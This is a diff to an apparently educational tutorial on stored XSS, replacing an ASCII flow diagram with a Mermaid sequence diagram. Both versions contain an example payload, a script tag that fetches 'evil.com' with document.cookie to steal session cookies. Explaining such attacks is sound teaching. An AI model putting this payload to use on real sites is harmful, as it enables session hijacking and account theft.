@@ -30,17 +30,23 @@ The most common goal of an XSS attack is stealing session cookies. If a script r
 ## Visual Explanation
 
 ### Stored XSS Script Execution Flow
-```text
-  [ Attacker submits comment ] ──> "<script>fetch('evil.com?cookie=' + document.cookie)</script>"
-                                               │
-                                               ▼
-                                  [ Saved in Database ]
-                                               │
-                                               ▼ (User visits page)
-  [ Database returns comment ] ──> [ Server renders raw comment ] ──> [ Browser Executes Script ]
-                                                                             │
-                                                                             ▼ (Credential Leak)
-  [ Attacker's Server ] <── GET /evil.com?cookie=session-id <────────────────┘
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker as Attacker Client
+    participant DB as Database
+    participant Server as Express Server
+    actor Victim as Victim Client
+    participant Evil as Attacker's Evil Server
+
+    Attacker->>Server: Submits comment containing malicious script:<br/>&lt;script&gt;fetch('evil.com?cookie=' + document.cookie)&lt;/script&gt;
+    Server->>DB: Stores comment as raw string
+    Victim->>Server: Requests blog post page
+    Server->>DB: Retrieves comment string
+    DB-->>Server: Raw comment payload
+    Server-->>Victim: Renders raw comment string in HTML response
+    Note over Victim: Browser parses HTML and executes script
+    Victim->>Evil: GET /evil.com?cookie=session-id (Credential Leak)
 ```
 
 ## Real-World Example
